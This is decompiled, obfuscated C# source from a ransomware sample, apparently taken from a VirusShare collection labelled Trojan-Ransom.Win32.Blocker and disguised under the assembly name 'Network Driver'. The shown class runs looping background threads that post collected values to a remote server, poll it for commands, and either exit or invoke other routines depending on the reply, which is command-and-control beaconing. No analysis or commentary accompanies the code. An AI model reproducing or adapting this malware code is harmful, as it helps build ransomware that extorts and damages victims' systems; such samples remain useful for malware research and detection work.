// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Network Driver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 31A0C38B-3584-42BE-8C71-509BA5DF4465
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.cnvx-6c4df7ef35e4d5aa4c5d4df1ed2dc33691c7736a.exe

using \u0001;
using \u0005;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0003
{
  internal sealed class \u0005 : \u0003.\u0004
  {
    [NonSerialized]
    internal new static \u0002 \u0001;
    private static string \u0001;

    public static void \u0003()
    {
      \u0003.\u0005.\u0004();
      Thread thread = new Thread(new ThreadStart(\u0003.\u0005.\u0005));
      \u0090\u0003.\u007E\u0097\u0002((object) thread);
    }

    private static void \u0004()
    {
      string[] strArray = new string[8]
      {
        \u0003.\u0005.\u0001(925),
        \u0004.\u0004.\u0003,
        \u0003.\u0005.\u0001(942),
        \u0004.\u0004.\u0005,
        \u0003.\u0005.\u0001(955),
        \u0004.\u0004.\u0006,
        \u0003.\u0005.\u0001(968),
        \u0004.\u0004.\u0004
      };
      string str1 = \u0087\u0003.\u0099(strArray);
      while (true)
      {
        try
        {
          string str2 = \u0003.\u0005.\u0003(\u0004.\u0004.\u0007, str1);
          if (\u009B.\u007E\u0088((object) str2) > 0)
          {
            if (\u0005\u0003.\u0084(str2, \u0004.\u0004.\u0002))
              break;
            \u001C\u0002.\u0017\u0002(0);
          }
        }
        catch
        {
        }
        \u001C\u0002.\u009A\u0002(\u0004.\u0004.\u0008 * 1000);
      }
    }

    private static void \u0005()
    {
      string str1 = \u0091\u0003.\u0097(\u0003.\u0005.\u0001(981), \u0004.\u0004.\u0003);
      while (true)
      {
        try
        {
          string str2 = \u0003.\u0005.\u0003(\u0004.\u0004.\u0007, str1);
          if (\u009B.\u007E\u0088((object) str2) > 0)
          {
            if (\u0005\u0003.\u0086(str2, \u0003.\u0005.\u0001))
            {
              \u0003.\u0004.\u0003(str2);
              \u0003.\u0005.\u0001 = str2;
            }
          }
          else
          {
            try
            {
              \u0005.\u0004.\u0004();
            }
            catch
            {
            }
            try
            {
              \u0002.\u0004();
            }
            catch
            {
            }
            \u0003.\u0005.\u0001 = string.Empty;
          }
        }
        catch
        {
        }
        \u001C\u0002.\u009A\u0002(\u0004.\u0004.\u0008 * 1000);
      }
    }

    private static string \u0003([In] string obj0, [In] string obj1)
    {
      \u008B\u0002.\u008D\u0004(false);
      HttpWebRequest httpWebRequest = (HttpWebRequest) \u0088\u0003.\u0081\u0004(obj0);
      \u0087\u0002.\u007E\u0084\u0004((object) httpWebRequest, \u0003.\u0005.\u0001(998));
      \u0087\u0002.\u007E\u0082\u0004((object) httpWebRequest, \u0003.\u0005.\u0001(1043));
      \u0087\u0002.\u007E\u0089\u0004((object) httpWebRequest, \u0004.\u0004.\u0002);
      byte[] numArray = \u0097\u0003.\u007E\u0083\u0003((object) \u0080\u0002.\u0084\u0003(), obj1);
      \u001A\u0003.\u007E\u0083\u0004((object) httpWebRequest, (long) numArray.Length);
      Stream stream = \u000E\u0003.\u007E\u0086\u0004((object) httpWebRequest);
      \u009D\u0002.\u007E\u0097\u0003((object) stream, numArray, 0, numArray.Length);
      \u0090\u0003.\u007E\u0094\u0003((object) stream);
      WebResponse webResponse = \u0003\u0002.\u007E\u0087\u0004((object) httpWebRequest);
      if (webResponse == null)
        return string.Empty;
      StreamReader streamReader = new StreamReader(\u000E\u0003.\u007E\u0088\u0004((object) webResponse));
      return \u0090\u0002.\u007E\u0093((object) \u0090\u0002.\u007E\u0003\u0004((object) streamReader));
    }

    static \u0005()
    {
      \u0001.\u0003.\u0003();
      \u0003.\u0005.\u0001 = string.Empty;
    }
  }
}
